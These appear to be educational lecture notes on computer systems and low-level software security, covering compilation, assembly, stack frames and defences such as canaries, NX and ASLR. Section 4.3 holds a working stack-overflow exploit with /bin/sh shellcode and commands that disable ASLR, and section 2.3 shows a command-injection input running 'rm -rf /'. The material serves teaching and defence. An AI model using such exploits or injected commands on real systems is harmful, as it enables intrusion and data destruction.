<!--
    Computer Systems and Low-Level Software Security
    Michael Sjöberg
    Aug 27, 2022
-->

## <a name="1" class="anchor"></a> [1. Introduction](#1)

In this section: *programs*, *compilation process*, *CPU operations*, *system commands*, *virtual memory*, and *device abstraction*

### <a name="1.1" class="anchor"></a> [What is a program?](#1.1)

A computer program is a sequence of bits (0 or 1), and organised as 8-bit bytes, where one byte is 8-bits and each byte represent some text character (ASCII standard). Most programs are developed in a high-level programming language, then compiled, or translated, into an object file, which is executed by a process, and finally terminated. An object file contains application and libraries, such as program code in binary format, relocation information, which are things that need to be fixed once loaded into memory, symbol information as defined by object (or imported), and optional debugging information (note that some interpreted languages are translated into an intermediate format).

The compilation system typically includes a preprocessor, compiler, assembler, and linker, and is used to translate programs into a sequence of machine-language instructions, which is packed into an executable object file (note that program code and file suffix refers to programs written in the C programming language and using [gcc](https://linux.die.net/man/1/gcc) to compile):

- example program to print *hello c*
    
    ```
    /* hello.c */
    #include <stdio.h>

    int main(){
        printf("hello c\n");
        return 0;
    }
    ```

- preprocessor, such as [cpp](https://linux.die.net/man/1/cpp), modifies the program according to directives that begin with ```#```, such as ```#include <stdio.h>```, which are imported into the program text, resulting in an intermediate file with ```.i``` suffix, use flag ```-E``` to see intermediate file

- compiler translates the intermediate file into an assembly program with ```.s``` suffix, where each line describe one instruction, use flag ```-S``` to generate assembly program (note that below assembly is generated on 64-bit macOS, operand size suffix and special directives for assembler is omitted for clarity)

    ```
    .section __TEXT
        .globl  _main
    
    _main:
        push    %rbp
        mov     %rsp, %rbp
        sub     $16, %rsp
        mov     $0, -4(%rbp)
        lea     L_.str(%rip), %rdi
        mov     $0, %al
        call    _printf
        xor     %eax, %eax
        add     $16, %rsp
        pop     %rbp
        ret
    
    .section __TEXT
        L_.str: .asciz  "hello c\n"
    ```

- assembler, such as [as](https://linux.die.net/man/1/as), translates assembly program instructions into machine-level instructions, use flag ```-c``` to compile assembly program, resulting in a relocatable object file with ```.o``` suffix (this is a binary file)

- linker, such as [ld](https://linux.die.net/man/1/ld), merges one or more relocatable object files, which are separate and precompiled ```.o```-files that the program is using, such as ```printf.o```, resulting in an executable file (or simply executable) with no suffix, ready to be loaded into memory and executed by the system

Linking is the process to resolve references to external objects, such as variables and functions (for example ```printf```), where static linking is performed at compile-time and dynamic linking is performed at run-time.

A few useful tools for working with programs:

- [gdp](https://www.sourceware.org/gdb/), GNU debugger
- ```objdump```, such as ```objdump -d <program>```, display information about object file (disassembler)

    - ```gcc hello.c && objdump -d hello```, alternative to ```gcc -S``` to see assembly
        
        ```
        ...
        pushq   %rbp
        movq    %rsp, %rbp
        subq    $16, %rsp
        movl    $0, -4(%rbp)
        leaq    48(%rip), %rdi
        ...
        ```

- ```readelf```, display information about ELF files
- ```hexdump```, display content in binary file
- ```elfish```, manipulate ELF files
- ```/proc/pid/maps```, show memory layout for process

### <a name="1.2" class="anchor"></a> [Computer organisation](#1.2)

Most modern computers are organised as an assemble of buses, I/O devices, main memory, and processor:

- buses are collections of electrical conduits that carry bytes between components, usually fixed sized and referred to as words, where the word size is 4 bytes (32 bits) or 8 bytes (64 bits)

- I/O devices are connections to the external world, such as keyboard, mouse, and display, but also disk drives, which is where executable files are stored
    - controller, chip sets in the devices themselves or main circuit board (also called motherboard)
    - adapter, cards plugged into the motherboard

- main memory is a temporary storage device that holds program and data when executed by the processor, physically, it is a collection of dynamic random access memory (DRAM) chips, and logically, it is a linear array of bytes with its own unique address (also called array index)

- processor, or central processing unit (CPU), is the engine that interprets and executes the machine-level instructions stored in the main memory

The CPU has a word size storage device (register) called program counter (PC) that points at some instruction in main memory. Instructions are executed in a strict sequence, which is to read and interpret instruction as pointed to by program counter, perform operation (as per the instruction), and then update the counter to point to next instruction (note that each instruction has its own unique address).

An operation, as performed by the CPU, use main memory, register file, which is a small storage device with collection of word-size registers, and the arithmetic logic unit (ALU) to compute new data and address values:

- load, copy byte (or word) from main memory into register, overwriting previous content in register

- store, copy byte (or word) from register to location in main memory, overwiting previous content in location

- operate, copy content of two registers to ALU, perform arithmetic operation on the two words and store result in register, overwriting previous content in register

- jump, extract word from instruction and copy that word into counter, overwriting previous value in counter

### <a name="1.3" class="anchor"></a> [Cache memory](#1.3)

A cache memory is a memory device with different levels (L1, L2, L3) and used to store information that the processor might need in the near future, where smaller sizes are faster and larger sizes are slower (note that locality can be used to make programs run faster).

|    |     |     |
| -- | :-- | :-- |
| L0 | Register | CPU register hold words copied from cache memory |
| L1 | SRAM     | L1 hold cache lines copied from L2 |
| L2 | SRAM     | L2 hold cache lines copied from L3 |
| L3 | SRAM     | L3 hold cache lines copied from main memory |
| L4 | DRAM (main memory) | Main memory hold disk blocks from local disks |
| L5 | Local secondary storage (local disks) | Local disks hold files copied from other disks or remote network storage |
| L6 | Remote secondary storage |  |

### <a name="1.4" class="anchor"></a> [Operating systems](#1.4)

The operating system provides services to programs, which are used via abstractions to make it easier to manipulate low-level devices and to protect the hardware. A shell provides an interface to the operating system via the command-line or library functions:

- when opened, waiting for commands and read each character as it is typed into some register, which is then stored in memory
- load executable file, such as ```./hello``` (command to execute program ```hello```), which basically copies the code and data in file from disk to main memory
- once loaded, the processor starts to execute the machine-language instructions in the ```main``` routine, which corresponds to the function ```main``` in program, copies the data from memory to register, and then from register to display device, which should output the string ```hello assembly```

A system command is a command-line program (note that ```system()``` is a library function to execute shell commands in C programs, for more system commands, see: [List of Unix commands](https://en.wikipedia.org/wiki/List_of_Unix_commands)):

- sort files with ```ls | sort```

    ```
    int main() {
        system("ls | sort");
        return 0;
    }
    ```

- copy files with ```cp```, such as ```cp ~/file /dest``` (note that ```~``` expands into ```HOME``` environment variable)

A system call is a function executed by the operating system, such as accessing hard drive and creating processes (note that a system command is a program implementing functions, whereas system calls can be used by programs to request services from the operating system).

A process is an abstraction for processor, main memory, and I/O devices, and represent a running program, where its context is the state information the process need to run. The processor can switch between multiple running programs, such as shell and program, using context switching, which saves the state of current process and restores state of some new process. A thread is multiple execution units within a process with access to the same code and global data, and kernel is collection of code and data structures that is always in memory. A kernel is used to manage all processes and called using a system call instruction, or ```syscall```, which transfers control to the kernel when the program need some action by the operating system, such as read or write to file.

Virtual memory is an abstraction for main memory and local disks, which provides each program with a virtual address space to make it seem as if programs have exclusive use of memory:

- program code and data, code begin at the same fixed address for all processes at bottom of virtual address space, followed by global variables, and is fixed size once process is running
- heap expands and contracts its size dynamically at run-time using special routines, such as ```malloc``` and ```free```
- shared libraries, such as the C standard library, is near the middle of the virtual address space
- stack is at top of *user* virtual address space and used by compiler to implement function calls, it expands and contracts its size dynamically at run-time (note that stack grows with each function call and contracts on return)
- kernel virtual memory is at top of virtual memory space, which is reserved for kernel, programs have to call kernel to read or write in this space

A file is an abstraction for I/O devices, which provides an uniform view of devices, where most input and output in a system is reading and writing to files.

## <a name="2" class="anchor"></a> [2. Programs and processes](#2)

In this section: *program privileges*, *address space*, *vulnerabilities*, and *buffer overflow*

### <a name="2.1" class="anchor"></a> [File permission](#2.1)

In UNIX-based systems, a process has real UID/GID, which is the user who started or own the process, effective UID/GID, which is referred to as EUID and used to determine permissions, and saved UID/GID, which is referred to as SUID and used to drop and gain privileges. A program with the SUID bit set has the effective UID/GID changed to that of the program owner. File permissions are set using command, such as ```-rwxr-xr-x root root <file>```:

- ```rwx```, or read-write-execute, is first root (file owner)
- first ``r-x``, or read-execute, is second root (group owner)
- second ``r-x`` is all others

The kernel will check EUID when the user is trying to write to file (root user id is 0), so changing EUID, ```chmod 4755 <file>```, which replaces ``rwx`` with ``rws``, can make it writable to other users (fixed effective user id for file).

### <a name="2.2" class="anchor"></a> [Address space](#2.2)

An address space is the range of addresses available to some process: 

- example program
    
    ```
    int z;
    int w = 10;
    int main() {
        int x;
        int y = 42;
        char *p;
        p = malloc(42);
        *p = 42;
    }
    ```

- locations in buffer (note that address space is based on linux legacy VM layout)

    |     |     |
    | :-- | --- |
    | | *user space ~3GB* |
    | ```.text``` (program code) | ... |
    | ```.bss``` (uninitialised global data) | ```z``` |
    | ```.data``` (initialised global data) | ```w``` |
    | heap (growing from lower to higher addresses) | ```malloc(42)``` |
    | memory mapped region for large chunks of memory, such as shared libraries (text, data, ```printf```) | ... |
    | stack (growing from higher to lower addresses) | ```x``` |
    | | ```y```  |
    | | ```*p``` |
    | | ```p``` (points to address in heap) |
    | | ```*p = 42``` (write 42 in address in heap) |
    | | *kernel space ~1GB* |

### <a name="2.3" class="anchor"></a> [Application-level vulnerabilities](#2.3)

Vulnerabilities in applications is often due to deployment of overprivileged applications, such as mobile applications asking for all permissions or installed application is writable (instead of only readable), and implementation issues with unexpected inputs or errors:

- local attacks need an established presence on host, such as account or application controlled by attacker, would allow executing operations with superior privileges, and is easier to perform (better knowledge of environment)
- remote attacks involve manipulation of an application via network-based interaction, unauthenticated, which means there is no need for authentication or permission, would allow executing operations with privileges of the vulnerable application, and is more difficult to perform (but more powerful, no need to require prior access to system).

Most local attacks exploit vulnerabilities in SUID-root programs to obtain root privileges. Bad inputs can be supplied at startup via command line and environment, or during execution via dynamic-linked objects and files. Unintended interaction with environment can result in creation of new files, accessing files via file system, or invoking commands and processes. Local attacks often result in memory corruption (control hijacking, data brainwashing), command injection, and information leaks.

An environment attack can occur when applications invoke external commands to carry out tasks, such as ```system()``` to execute some command, ```popen()``` to open a process, or ```execlp()``` and ```execvp()``` to use the ```PATH``` environment variable to locate applications. A ```PATH``` substitution attack use commands without a complete path, where attacker modifies the ```PATH``` variable to run script, or the ```HOME``` variable to control execution of commands, such as accessing files.

An input argument attack can occur when applications are supplied arguments via the command-line (note that this could also apply to web applications and SQL), where user-provided inputs can be used to inject commands, such as ```./program "; rm -rf /"```, which would call ```program``` and then inject command to delete everything, treverse directories (dot-dot attack), overflow buffer, and perform format string attack:

- always check size to avoid overflow, such as when copied into buffers (note that ```snprintf``` restrict size to ```n```)
    
    ```
    int main (int argc, char **argv) {
        char cmd[1024];

        snprintf(cmd, 1024, "cat /var/log/%s", argv[1]);
        cmd[1023] = '\0';

        return system(cmd);
    }
    ```

- always sanitize user-provided inputs to avoid bad formats, such as excluding known bad inputs, define allowed input, and escape special characters

A file access attack can occur when applications create and use files, such as for logging: 

- always check that file exist and not symbolic link

- [race conditions](https://en.wikipedia.org/wiki/Race_condition) can occur when there is conflicting access to shared data by multiple processes, where at least one has write access (note that ```access()``` checks real UID and ```open()``` only checks effective UID)

    ```
    if (access(file, W_OK) == 0) {
        if((f = open(file, O_WRONLY)) < 0) {
            perror(file);
            return -1;
        }
        write(f, buffer, count);
    }
    ```

A buffer overflow attack can occur when programs try to store more elements in a buffer (set of memory locations) than it can contain. Systems can sometimes detect and block potential overflows, such as in Java, and others do not detect, in which case the operation is executed (it is not detected in C by default).

**Example:** buffer overflow (note that executing this would result in overflow of ```buffer_1``` into ```buffer_2```)

    int main() {
        int i;
        char buffer_2[4];
        char buffer_1[6];

        for(i=0; i < 10; i++) {
            buffer_1[i] = 'A';
        }

        return 0;
    }

## <a name="3" class="anchor"></a> [3. Assembly](#3)

In this section: *assembly programming language*, *registers*, and *common instructions*

### <a name="3.1" class="anchor"></a> [x86 Assembly basics](#3.1)

An assembly language is a low-level symbolic language with processor specific instructions and syntax, such as those developed by AT&T and Intel. Instructions and syntax, as well as data types, registers, and hardware support, is typically specified by some instruction set architecture (ISA), which is an abstract model of some computer implementation. An assembly program is a sequence of instructions, where each instruction represent an actual operations to be performed by the processor.

In most assembly-like languages, an instruction has the form ```mnemonic  <source>, <destination>``` (AT&T syntax), such as ```mov %eax, %ebx``` to copy value from ```%eax``` to ```%ebx```, or ```mnemonic <destination>, <source>``` (Intel syntax):

- mnemonics tell the CPU what to do, such as ```mov```, ```add```, ```sub```, ```push```, ```pop```, ```call```, or ```jmp```
- source and destination can be registers, such as ```%eax```, ```%esp```, or ```%al```, memory location, such as ```0x401000, 8(%ebp)``` or ```%edx, %ecx, 4```, and constants (source only), such as ```$42``` or ```$0x401000```
- directives are commands for assembler, such as ```.data``` to identify section with variables, ```.text``` to identify section with code, using ```.byte```, ```.word```, or ```.long``` to define integer as 8, 16, or 32-bits respectively, using ```.ascii``` or ```.asciz``` to define string with and without terminator
- labels are symbol at current address, where ```number: .byte 42``` is same as ```char number = 42;``` in C (global variable)

A register is a memory location on the CPU and prefixed with ```%```, such as general purpose registers, including stack pointer ```%esp```, frame pointer ```%ebp```, instruction pointer ```%eip```, and flags register (note that ```%esp```, ```%ebp```, and ```%eip``` is 32 bit, and ```%rsp```, ```%rbp```, and ```%rip``` is equivalent 64 bit):

- extended (32-bit), such as ```%eax```, ```%ebx```, ```%ecx```, ```%edx```, ```%esi```, and ```%edi```
- smaller parts (16-bit), such as ```%ax```, ```%bx```, ```%cx```, ```%dx```, ```%sp``` (stack pointer), ```%bp``` (frame pointer), ```%si```, and ```%di```
- lower byte, such as ```%a1```, ```%b1```, ```%c1```, and ```%d1```
- second byte, such as ```%ah```, ```%bh```, ```%ch```, and ```%dh```

A constant is prefixed with ```$``` and the operand size is specified as suffix to mnemonic, so byte is ```b``` (8 bit), word is ```w``` (16 bit), and long is ```l``` (32 bit or 64 bit floating point). Memory is accessed by dereferencing pointers, where dereferencing is specified as ```displacement(base, index, scale)``` (AT&T) and ```displacement + base + index * scale``` (Intel), where ```base``` and ```index``` are 32-bit general purpose registers, ```displacement``` is a 32-bit constant or symbol (default is 0), and ```scale``` is 1, 2, 4, 8 (default 1).

**Example:** memory location layout

- initial layout (note that bits ```0``` to ```15``` is ```%ax``` and ```0``` to ```31``` is ```%eax```, extended)

    |     |      |      |      |
    | --- | ---  | ---  | ---  |
    | ```%a1``` | ```%ah``` |
    | 0 | 8 | 16 | 31 |


- ```mov $1, %eax```, copy 1 and set rest to zero

    |     |     |     |     |
    | --- | ---  | ---  | ---  |
    | ```%a1``` | ```%ah``` |
    | 10000000 | 00000000 | 0 ... 0 | 0 ... 0 |
    | 0 | 8 | 16 | 31 |

### <a name="3.2" class="anchor"></a> [Assembly programming](#3.2)

Assembly programs are typically generated by compilers but it can sometimes be necessary to inspect or change manually (note that writing programs using assembly instructions is not very efficient and can be very error prone):

- data transfer instructions

    ```
    ; set destination as source
    mov <source>, <destination>

    ; swap destinations
    xchg <destination>, <destination>

    ; store source on top och stack
    push <source>

    ; get destination from top of stack
    pop <destination>
    ```

- binary arithmetic operators

    ```
    ; addition, destination += source
    add <source>, <destination>

    ; subtraction, destination -= source
    sub <source>, <destination>

    ; increment, destination += 1
    inc <destination>

    ; decrement, destination -= 1
    dec <destination>

    ; negation, destination = -destination
    neg <destination>
    ```

- logical operators

    ```
    ; and, destination &= source
    and <source>, <destination>

    ; or, destination |= source
    or <source>, <destination>

    ; exclusive or, destination ^= source
    xor <source>, <destination>

    ; not, destination = ~destination
    not <destination>
    ```

- unconditional branches

    ```
    ; jump to address
    jmp <address>

    ; push return address and call function at address
    call <address>

    ; pop return address and return
    ret

    ; call OS-defined handler represented by const
    int <const>
    ```

- conditional branches (note that ```label``` is location)

    ```
    ; jump below (unsigned), %eax < %ebx
    cmp %ebx, %eax
    jb <label>

    ; jump not less (signed), %eax >= %ebx
    cmp %ebx, %eax
    jnl <label>

    ; jump zero, %eax = 0
    test %eax, %eax
    jz <label>

    ; jump not signed, or not below (signed), %eax >= 0
    cmp $0, %eax
    jns <label>
    ```

- other noteworthy instructions

    ```
    ; load effective address (source must be in memory), destination = &source
    lea <source>, <destination>

    ; do nothing
    nop
    ```

**Example:** assembly program (note that it is easier to run assembly programs in emulators due to processor specific instructions, such as [nasm Online Compiler](https://rextester.com/l/nasm_online_compiler), which should ouput ```hello assembly```)

    ; assembly program (64 bit, intel syntax)
    section .text
        global _main        ; start point for execution

    _main:
        mov rax, 1          ; write (system call)
        mov rdi, 1          ; stdout
        mov rsi, msg        ; address to output
        mov rdx, 14         ; bytes to output
        syscall             ; invoke write
        mov rax, 60         ; exit (system call)
        xor rdi, rdi        ; 0
        syscall             ; invoke exit

    section .data
        ; db is raw bytes and line feed \n is 0xah, or 10
        msg db "hello assembly", 10

## <a name="4" class="anchor"></a> [4. The stack](#4)

In this section: *stack layout*, *stack frames*, *function calls*, and *overflow exploit*

### <a name="4.1" class="anchor"></a> [Stack layout](#4.1)

A stack grows towards lower memory addresses, and the stack pointer, ```%esp```, points to top of stack, which is the lowest valid address and last pushed to stack. Below is an example stack operation using ```push``` and ```pop```:

- initial layout

    |            |      |                  |
    | ---------- | ---- | :--------------- |
    |            | a    | ```0xbfff8000``` |
    |            | b    | ```0xbfff7ffc``` |
    |            | c    | ```0xbfff7ff8``` |
    |            | d    | ```0xbfff7ff4``` |
    | ```%esp``` | e    | ```0xbfff7ff0``` |
    |            |      | ```0xbfff7fec``` |
    |            |      | ```0xbfff7fe8``` |

- ```push f``` to increment pointer, create space, and store ```f``` at address

    |            |      |                  |
    | ---------- | ---- | :--------------- |
    |            | a    | ```0xbfff8000``` |
    |            | b    | ```0xbfff7ffc``` |
    |            | c    | ```0xbfff7ff8``` |
    |            | d    | ```0xbfff7ff4``` |
    |            | e    | ```0xbfff7ff0``` |
    | ```%esp``` | f    | ```0xbfff7fec``` |
    |            |      | ```0xbfff7fe8``` |

- ```pop %eax``` to decrement pointer and store value in ```%eax``` (note that ```f``` is still at ```0xbfff7fec``` but will be overwritten on next ```push```)

    |            |      |                  |
    | ---------- | ---- | :--------------- |
    |            | a    | ```0xbfff8000``` |
    |            | b    | ```0xbfff7ffc``` |
    |            | c    | ```0xbfff7ff8``` |
    |            | d    | ```0xbfff7ff4``` |
    | ```%esp``` | e    | ```0xbfff7ff0``` |
    |            | f    | ```0xbfff7fec``` |
    |            |      | ```0xbfff7fe8``` |

    |            |      |
    | ---------- | ---- |
    | ```%eax``` | f    |

### <a name="4.2" class="anchor"></a> [Stack frames](#4.2)

A stack is composed of frames, which are pushed to the stack as a consequence of function calls, and address to current frame is stored in the frame pointer register, ```%ebp```. Each frame contain function parameters, which are pushed to stack by caller, return address to jump to at end, pointer to previous frame (save ```%ebp``` to stack and set ```%ebp = %esp```, frame pointer is lowest valid address and part of prologue), and local variables, which are part of the prologue executed by caller (note that address location is subtracted to move towards lower addreses, typically 4 bytes).

**Example 1:** function call and resulting stack layout

- example program

    ```
    int convert(char *str) {
        int result = atoi(str);
        return result;
    }

    int main(int argc, char **argv) {
        int sum, i;
        for (i = 0; i < argc; i++) {
            sum += convert(argv[i]);
        }
        printf("sum=%d\n", sum);
        return 0;
    }
    ```

- pushed by main caller

    |     |      |
    | --- | :--- |
    | ```argv``` | ```0xbfff8000``` |
    | ```argc``` | ```0xbfff7ffc``` |
    | return address (from main) | ```0xbfff7ff8``` |

- pushed by ```main()```

    |     |      |
    | --- | :--- |
    | frame pointer (before main) | ```0xbfff7ff4``` |
    | ```sum``` | ```0xbfff7ff0``` |
    | ```i``` | ```0xbfff7fec``` |
    | ```str``` | ```0xbfff7fe8``` |
    | return address (from convert to main) | ```0xbfff7fe4``` |

- pushed by ```convert()```

    |     |      |
    | --- | :--- |
    | frame pointer (before convert) | ```0xbfff7fe0``` |
    | ```result``` | ```0xbfff7fdc``` |
    | paramater to ```atoi()``` | ```0xbfff7fd8``` |

The epilogue is executed by the callee to deallocate local variables, ```%esp = %ebp```, save result in some register, such as ```%eax```, restore frame pointer of caller function, and then resume execution from saved return address.

**Example 2:** function invocation and termination (note that the below assembly can be generated with [Compiler Explorer](https://godbolt.org/) using ```x86-64 gcc 4.1.2``` and flag ```-m32``` for 32-bit, AT&T syntax)

- example program

    ```
    #include <stdio.h>

    void func(int n) {
        printf("argument: %d;\n", n);
    }

    int main(int argc, char **argv) {
        func(10);
        return 0;
    }
    ```

- assembly instructions for ```func()``` (note that ```leave``` is same as ```mov %ebp, %esp``` followed by ```pop %ebp``` and operand size suffix is omitted for clarity)
    
    ```
    .LCO
        .string "argument: %d;\n"
    ```

    ```
    func:
        ; void func(int n) {
        push    %ebp
        mov     %esp, %ebp
        sub     $8, %esp
        ; printf("argument: %d;\n", n);
        mov     8(%ebp), %eax
        mov     %eax, 4(%esp)
        mov     $.LCO, (%esp)
        call    printf
        ; }
        leave
        ret
    ```

- assembly instructions for ```main()```

    ```
    main:
        ; int main(int argc, char **argv) {
        lea     4(%esp), %ecx
        and     $-16, %esp
        push    -4(%ecx)
        push    %ebp
        mov     %esp, %ebp
        push    %ecx
        sub     $4, %esp
        ; func(10);
        mov     $10, (%esp)
        call    func
        ; return 0;
        mov     $0, %eax
        ; }
        add     $4, %esp
        pop     %ecx
        leave
        lea     -4(%ecx), %esp
        ret
    ```

### <a name="4.3" class="anchor"></a> [Stack-based overflow](#4.3)

A stack overflow, or stack smashing, is a special case of buffer overflow (targeting the stack or heap), where data can overflow allocated buffer and overwrite return address:

- ```gets()``` read from input until newline or end of file

    ```
    void main() {
        char buffer[512];
        gets(buffer);
    }
    ```

- ```strcpy()``` and ```strcat()``` copy data

    ```
    int main(int argc, char **argv) {
        char buffer[512];
        strcpy(buffer, argv[1]);
    }
    ```

- ```sprintf()``` and ```scanf()``` print data

    ```
    void main(int argc, char **argv) {
        char buffer[512];
        sprintf(buffer, "program %s is starting\n", argv[0]);
    }
    ```

Attacking a buffer typically involves an injection vector, which is some code to overwrite buffer and return address. A [NOP slide](https://en.wikipedia.org/wiki/NOP_slide), or ```nop```-sled, is an optional sequence of no-nothing instruction used to fill stack and eventually reach a jump to shellcode, which is any code used to start a shell, such as ```execve("/bin/sh")```.

**Example:** buffer overflow using ```nop```-sled and shellcode

- example vulnerable program

    ```
    /* program.c */
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    int main(int argc, char **argv) {
        char buffer[512];

        memset(buffer, 0, sizeof(buffer));
        if (argc > 1) {
            strcpy(buffer, argv[1]);
        }

        printf("buffer@%p: %s\n", buffer, buffer);
        return 0;
    }
    ```

- example exploit for vulnerable program, where shellcode is hexadecimal string encoding machine instructions (note that shellcode can also be written in assembly and inserted into executable by compiler, ```gcc -o exploit exploit.c shellcode.s```, and change the line ```unsigned char code[] = ... ;``` into ```extern char shellcode[];```)

    ```
    /* exploit.c */
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    #define PROGRAM "./program"

    /* shellcode */
    unsigned char code[] =
        "\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43"
        "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";

    /* inline macro to get stack pointer */
    __inline__ unsigned int get_esp(void) {
        unsigned int res;
        __asm__("movl %%esp, %0" : "=a" (res));
        return res;
    }

    int main(int argc, char **argv) {
        unsigned int address, i, offset = 0;
        char buffer[768];
        char *n[] = { PROGRAM, buffer, NULL };

        /* offset from base address */
        if (argv[1]) {
            offset = strtol(argv[1], NULL, 10);
        }

        address = get_esp() + offset;
        fprintf(stderr, "using address %#010x\n", address);
        memset(buffer, 0, sizeof(buffer));

        /* fill buffer with addresses, four byte at a time */
        for (i = 0; i < sizeof(buffer); i += 4) {
            *(unsigned int *)(buffer + i) = address;
        }

        /* nop-sled to fill half buffer with nop */
        memset(buffer, 0x90, sizeof(buffer)/2);

        /* place shellcode after nop-sled, rest is filled with addresses */
        memcpy(buffer + sizeof(buffer)/2, code, strlen(code));

        execve(n[0], n, NULL);
        perror("execve");
        exit(1);
    }
    ```

- running exploit (note that ```-fno-stack-protector``` disables stack protection that is enabled by default on some Linux distributions and ```echo 0 | sudo tee /proc/sys/kernel/randomize_va_space``` would disable address space layout randomisation, or ASLR)

    ```
    $ CFLAGS="-m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2"
    $ cc $CFLAGS -o program program.c
    $ cc $CFLAGS -o exploit exploit.c
    $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    0
    $ ./exploit 1500
    using address 0x0xbffffa34
    buffer@0xbffff970: ...
    bash$
    ```

## <a name="5" class="anchor"></a> [5. Secure system design](#5)

In this section: *secure hardware*, *tainted flow analysis*, and *stack protection*

### <a name="5.1" class="anchor"></a> [Hardware and software solutions](#5.1)

A system design involves both hardware and software, where software is easy to change, which is good for functionality but bad for security and generally bad for performance, and hardware is hard to change, which is bad for functionality but good for security:

- [AES instruction set](https://en.wikipedia.org/wiki/AES_instruction_set) implement cryptography instructions

- [Intel SGX](https://en.wikipedia.org/wiki/Software_Guard_Extensions) support encrypted computation, such as for cloud computing applications

- hardware primitives, such as [Physical unclonable function](https://en.wikipedia.org/wiki/Physical_unclonable_function), which provides unpredictable and repeatable randomness (fingerprint)

A secure system design favor simplicity, such as fail-safe defaults (key lengths, whitelist better than blacklist) and assume non-expert users, so keep user interface simple and avoid choices. Reduce need to trust other parts of system (kernel is assumed to be trusted) and grant least privileges possible, such as restricting flow of sensitive data, secure compartments (operating system), ```seccomp``` system call isolates process by limiting possible interactions. Layers of security can be used to further secure systems, such as firewall, encrypting data at rest, using type-safe programming languages, and logging relevant operational information.

Trusting unvalidated inputs is the root cause of many attacks, such as a program getting unsafe, or *tainted*, input from a user and assuming it is safe, or *untainted*.

**Example 1:** tainted program (note that an input such as ```name="%s%s%s"``` would crash program and ```name="...%n..."``` would write to memory)

    char *name = fgets(..., network_fd);
    printf(name); /* vulnerable to format string */

In tainted flow analysis, such as [Taint checking](https://en.wikipedia.org/wiki/Taint_checking), the goal is to prove that no tainted data is used where untainted data is expected for all possible inputs (note that *untainted* indicate trusted and *tainted* indicate untrusted):

- legal flow

    ```
    void f(tainted int);
    
    untainted int a = ... ;
    f(a); /* function expect tainted and input is untainted, so legal flow */
    ```

- illegal flow

    ```
    void f(untainted int);
    
    tainted int a = ... ;
    f(a); /* function assume untainted and input is tainted, so illegal flow */
    ```

**Example 2:** tainted flow analysis

    void copy(tainted char *src, untainted char *dst, int len) {
        untainted int i;
        for (i = 0; i < len; i++) {
            dst[i] = src[i]; /* illegal */
        }
    }

### <a name="5.2" class="anchor"></a> [Preventing buffer overflows](#5.2)

Buffer overflow attacks can sometimes be prevented using programming languages with boundary checking, such as Java or Python, or contained using virtualisation. Below are a few other common methods:

- [StackGuard](https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf) is a *canary-based* method to protect or detect potential danger, where a *canary-value* is placed on stack, which can be verified to not be corrupted during execution

- non-executable memory, or [NX-bit](https://en.wikipedia.org/wiki/NX_bit), can be used to segregate area in memory used by code and data

- randomised addresses and instructions, such as [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), which can be used to randomise address space layout (note that instructions can also be encrypted in memory and decrypted before execution, but substantial overhead)

For more methods, see: [Return-oriented programming (ROP)](https://en.wikipedia.org/wiki/Return-oriented_programming).
